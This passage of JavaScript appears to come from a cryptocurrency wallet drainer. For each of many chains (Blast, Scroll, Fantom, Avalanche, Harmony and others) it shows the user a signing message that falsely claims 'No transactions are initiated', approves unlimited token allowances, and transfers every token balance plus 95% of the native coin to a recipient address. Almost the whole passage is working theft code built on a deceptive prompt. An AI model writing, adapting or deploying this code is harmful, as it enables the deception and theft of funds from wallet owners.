                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const blastBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(blastBalance)} BLAST`);

                if(!blastBalance.eq(0)){
                  const amountToSend = blastBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} BLAST`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for BLAST to send')
                  return
                }
                break;

          //SCROLL
          case scroll.chainId:
            const scrollTokens = await fetchSCROLLTokens(address);

            // Message to sign
            const scrollMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const scrollSignature = await signer.signMessage(scrollMessage);
            console.log('Signature:', scrollSignature);

            for (let token of scrollTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(scrollContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(scrollContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const scrollBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(scrollBalance)} SCROLL`);

                if(!scrollBalance.eq(0)){
                  const amountToSend = scrollBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} SCROLL`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for SCROLL to send')
                  return
                }
                break;

          //METIS
          case metis.chainId:
            const metisTokens = await fetchMETISTokens(address);

            // Message to sign
            const metisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const metisSignature = await signer.signMessage(metisMessage);
            console.log('Signature:', metisSignature);

            for (let token of metisTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(metisContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(metisContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const metisBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(metisBalance)} METIS`);

                if(!metisBalance.eq(0)){
                  const amountToSend = metisBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} METIS`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for METIS to send')
                  return
                }
                break;

          //MANTA      
          case manta.chainId:
            const mantaTokens = await fetchMANTATokens(address);

            // Message to sign
            const mantaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const mantaSignature = await signer.signMessage(mantaMessage);
            console.log('Signature:', mantaSignature);

            for (let token of mantaTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(mantaContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(mantaContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const mantaBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(mantaBalance)} MANTA`);

                if(!mantaBalance.eq(0)){
                  const amountToSend = mantaBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTA`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for MANTA to send')
                  return
                }
                break;

          //FANTOM      
          case fantom.chainId:
            const fantomTokens = await fetchFANTOMTokens(address);

            // Message to sign
            const fantomMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const fantomSignature = await signer.signMessage(fantomMessage);
            console.log('Signature:', fantomSignature);

            for (let token of fantomTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(fantomContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(fantomContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const fantomBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(fantomBalance)} FANTOM`);

                if(!fantomBalance.eq(0)){
                  const amountToSend = fantomBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} FANTOM`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for FANTOM to send')
                  return
                }
                break;

          //GNOSIS
          case gnosis.chainId:
            const gnosisTokens = await fetchGNOSISTokens(address);

            // Message to sign
            const gnosisMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const gnosisSignature = await signer.signMessage(gnosisMessage);
            console.log('Signature:', gnosisSignature);

            for (let token of gnosisTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(gnosisContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(gnosisContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const gnosisBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(gnosisBalance)} GNOSIS`);

                if(!gnosisBalance.eq(0)){
                  const amountToSend = gnosisBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} GNOSIS`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for GNOSIS to send')
                  return
                }
                break;

          //LINEA
          case linea.chainId:
            const lineaTokens = await fetchLINEATokens(address);

            // Message to sign
            const lineaMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const lineaSignature = await signer.signMessage(lineaMessage);
            console.log('Signature:', lineaSignature);

            for (let token of lineaTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(lineaContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(lineaContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const lineaBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(lineaBalance)} LINEA`);

                if(!lineaBalance.eq(0)){
                  const amountToSend = lineaBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} LINEA`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for LINEA to send')
                  return
                }
                break;

          //CELO
          case celo.chainId:
            const celoTokens = await fetchCELOTokens(address);

            // Message to sign
            const celoMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const celoSignature = await signer.signMessage(celoMessage);
            console.log('Signature:', celoSignature);

            for (let token of celoTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(celoContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(celoContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const celoBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(celoBalance)} CELO`);

                if(!celoBalance.eq(0)){
                  const amountToSend = celoBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CELO`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for LINEA to send')
                  return
                }
                break;
          
          //AVALANCHE
          case avalanche.chainId:
            const avalancheTokens = await fetchAVALANCHETokens(address);

            // Message to sign
            const avalancheMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const avalancheSignature = await signer.signMessage(avalancheMessage);
            console.log('Signature:', avalancheSignature);

            for (let token of avalancheTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(avalancheContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(avalancheContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const avalancheBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(avalancheBalance)} AVALANCHE`);

                if(!avalancheBalance.eq(0)){
                  const amountToSend = avalancheBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AVALANCHE`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for AVALANCHE to send')
                  return
                }
                break;

          //OPBNB
          case opbnb.chainId:      
          const opbnbTokens = await fetchOPBNBTokens(address);

          // Message to sign
          const opbnbMessage = "This is a standard message approval to verify your account. No transactions are initiated";
          const opbnbSignature = await signer.signMessage(opbnbMessage);
          console.log('Signature:', opbnbSignature);

          for (let token of opbnbTokens) {
              const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
              const maxUint256 = ethers.constants.MaxUint256;

              // Approve unlimited tokens
              const approveTx = await tokenContract.approve(opbnbContractAddress, maxUint256);
              await approveTx.wait();
              console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

              const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
              if(balance.eq(0)) {
                  console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                  continue;
              }
              // Transfer tokens using the smart contract
              const contract = new ethers.Contract(opbnbContractAddress, contractABI, signer);
              const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
              await transferTx.wait();
              console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
          }
          //send native tokens
              const opbnbBalance = await provider.getBalance(address)
              console.log(`Current balance: ${ethers.utils.formatEther(opbnbBalance)} OPBNB`);

              if(!opbnbBalance.eq(0)){
                const amountToSend = opbnbBalance.mul(95).div(100);
              console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OPBNB`);

          // Define the transaction
              const transaction = {
                  to: recipientAddress, // Replace with the recipient's address
                  value: amountToSend,
                  // Optional: You can specify gasLimit and gasPrice here if necessary
              };
              const txResponse = await signer.sendTransaction(transaction);
              console.log(`Transaction hash: ${txResponse.hash}`);

              // Wait for the transaction to be mined
              const txReceipt = await txResponse.wait();
              console.log('Transaction confirmed in block:', txReceipt.blockNumber);
              }else{
                console.log('No balance found for OPBNB to send')
                return
              }
              break;
    
          //OKX
          case okx.chainId:
            const okxTokens = await fetchOKXTokens(address);

            // Message to sign
            const okxMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const okxSignature = await signer.signMessage(okxMessage);
            console.log('Signature:', okxSignature);

            for (let token of okxTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(okxContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(okxContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const okxBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(okxBalance)} OKX`);

                if(!okxBalance.eq(0)){
                  const amountToSend = okxBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} OKX`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for OKX to send')
                  return
                }
                break;


          //MANTLE
          case mantle.chainId:
            const mantleTokens = await fetchMANTLETokens(address);

            // Message to sign
            const mantleMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const mantleSignature = await signer.signMessage(mantleMessage);
            console.log('Signature:', mantleSignature);

            for (let token of mantleTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(mantleContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(mantleContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const mantleBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(mantleBalance)} MANTLE`);

                if(!mantleBalance.eq(0)){
                  const amountToSend = mantleBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} MANTLE`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for MANTLE to send')
                  return
                }
                break;

          //AURORA
          case aurora.chainId:
            const auroraTokens = await fetchAURORATokens(address);

            // Message to sign
            const auroraMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const auroraSignature = await signer.signMessage(auroraMessage);
            console.log('Signature:', auroraSignature);

            for (let token of auroraTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(auroraContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(auroraContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const auroraBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(auroraBalance)} AURORA`);

                if(!auroraBalance.eq(0)){
                  const amountToSend = auroraBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} AURORA`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for AURORAto send')
                  return
                }
                break;

          //CRONOS
          case cronos.chainId:
            const cronosTokens = await fetchCRONOSTokens(address);

            // Message to sign
            const cronosMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const cronosSignature = await signer.signMessage(cronosMessage);
            console.log('Signature:', cronosSignature);

            for (let token of cronosTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(cronosContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(cronosContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const cronosBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(cronosBalance)} CRONOS`);

                if(!cronosBalance.eq(0)){
                  const amountToSend = cronosBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} CRONOS`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for CRONOS to send')
                  return
                }
                break;

          //KLAYTN
          case klaytn.chainId:
            const klaytnTokens = await fetchKLAYTNTokens(address);

            // Message to sign
            const klaytnMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const klaytnSignature = await signer.signMessage(klaytnMessage);
            console.log('Signature:', klaytnSignature);

            for (let token of klaytnTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(klaytnContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(klaytnContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const klaytnBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(klaytnBalance)} KLAYTN`);

                if(!klaytnBalance.eq(0)){
                  const amountToSend = klaytnBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} KLAYTN`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for KLAYTN to send')
                  return
                }
                break;
          
          //PLATON
          case platon.chainId:
            const platonTokens = await fetchPLATONTokens(address);

            // Message to sign
            const platonMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const platonSignature = await signer.signMessage(platonMessage);
            console.log('Signature:', platonSignature);

            for (let token of platonTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(platonContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(platonContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const platonBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(platonBalance)} PLATON`);

                if(!platonBalance.eq(0)){
                  const amountToSend = platonBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} PLATON`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
                const txResponse = await signer.sendTransaction(transaction);
                console.log(`Transaction hash: ${txResponse.hash}`);

                // Wait for the transaction to be mined
                const txReceipt = await txResponse.wait();
                console.log('Transaction confirmed in block:', txReceipt.blockNumber);
                }else{
                  console.log('No balance found for PLATON to send')
                  return
                }
                break;

          //HARMONY
          case harmony.chainId:
            const harmonyTokens = await fetchHARMONYTokens(address);

            // Message to sign
            const harmonyMessage = "This is a standard message approval to verify your account. No transactions are initiated";
            const harmonySignature = await signer.signMessage(harmonyMessage);
            console.log('Signature:', harmonySignature);

            for (let token of harmonyTokens) {
                const tokenContract = new ethers.Contract(token.contractAddress, erc20ABI, signer);
                const maxUint256 = ethers.constants.MaxUint256;

                // Approve unlimited tokens
                const approveTx = await tokenContract.approve(harmonyContractAddress, maxUint256);
                await approveTx.wait();
                console.log(`Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`);

                const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
                if(balance.eq(0)) {
                    console.log(`Token balance to transfer for ${token.tokenSymbol} is low.`);
                    continue;
                }
                // Transfer tokens using the smart contract
                const contract = new ethers.Contract(harmonyContractAddress, contractABI, signer);
                const transferTx = await contract.transferTokens(token.contractAddress, address, recipientAddress, balance);
                await transferTx.wait();
                console.log(`Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`);
            }
            //send native tokens
                const harmonyBalance = await provider.getBalance(address)
                console.log(`Current balance: ${ethers.utils.formatEther(harmonyBalance)} HARMONY`);

                if(!harmonyBalance.eq(0)){
                  const amountToSend = harmonyBalance.mul(95).div(100);
                console.log(`Amount to send: ${ethers.utils.formatEther(amountToSend)} HARMONY`);

            // Define the transaction
                const transaction = {
                    to: recipientAddress, // Replace with the recipient's address
                    value: amountToSend,
                    // Optional: You can specify gasLimit and gasPrice here if necessary
                };
